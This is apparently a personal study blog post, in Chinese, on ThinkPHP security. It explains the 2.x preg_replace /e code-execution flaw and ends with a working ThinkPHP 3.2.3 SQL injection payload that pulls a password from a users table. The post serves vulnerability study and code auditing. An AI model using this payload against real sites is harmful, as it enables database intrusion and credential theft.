---
title: thinkphp框架
id: thinkphp框架
---

<!-- more -->

太久没学习了。。就打算学习一下thinkphp这个框架，简单跟着人家审计一下







# ThinkPHP 2.x 任意代码执行漏洞



- php版本<=5.6.29

- 成因是preg_replace()使用了修饰符/e匹配路由，导致用户的输入参数被插入双引号中执行，造成任意代码执行漏洞。

  ThinkPHP 3.0版本因为Lite模式下没有修复该漏洞，也存在这个漏洞。
  
  ```php
  #./ThinkPHP/Lib/Think/Util/Dispatcher.class.php:102: 
  $res = preg_replace('@(\w+)'.$depr.'([^'.$depr.'\/]+)@e', '$var[\'\\1\']="\\2";', implode($depr,$paths));
  ```
  

具体分析：

[ThinkPHP系列漏洞之ThinkPHP 2.x 任意代码执行 - FreeBuf网络安全行业门户](https://www.freebuf.com/sectool/223149.html)

[preg_replace的/e修饰符妙用与慎用 - WiFeng的博客 (521-wf.com)](https://521-wf.com/archives/45.html)

[PHP-Audit-Labs/README.md at master · hongriSec/PHP-Audit-Labs (github.com)](https://github.com/hongriSec/PHP-Audit-Labs/blob/master/Part1/Day8/files/README.md)



俺的理解：

1、preg_replace — 执行正则表达式的搜索和替换

> ```php
>mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit ] )
> # 在 subject 中搜索 pattern 模式的匹配项并替换为 replacement 。
> # 如果指定了 limit ，则仅替换 limit 个匹配，如果省略 limit 或者其值为 -1，则所有的匹配项都会被替换。
> ```
> 
> 而/e修正符会让preg_replace()将replacement参数当作php代码执行
>(当然要确保replacement构成合法的php代码字符串，否则会PHP会报告在包含 preg_replace() 的行中出现语法解析错误)

2、表达式反向引用





# Thinkphp3

[ThinkPHP3.2.3完全开发手册](https://www.kancloud.cn/manual/thinkphp/1678)

> thinkphp3版本路由格式:
>
> ```
> http://serverName/index.php/模块/控制器/方法/参数
> ```

[ThinkPHP3.2.3SQL注入分析 - Pan3a - 博客园 (cnblogs.com)](https://www.cnblogs.com/Pan3a/p/14873308.html)

## Thinkphp3.2.3 SQL注入

### where

payload:

```
?id[where]=1 and 1=updatexml(1,concat(0x7e,(select password from users limit 1),0x7e),1)%23
```













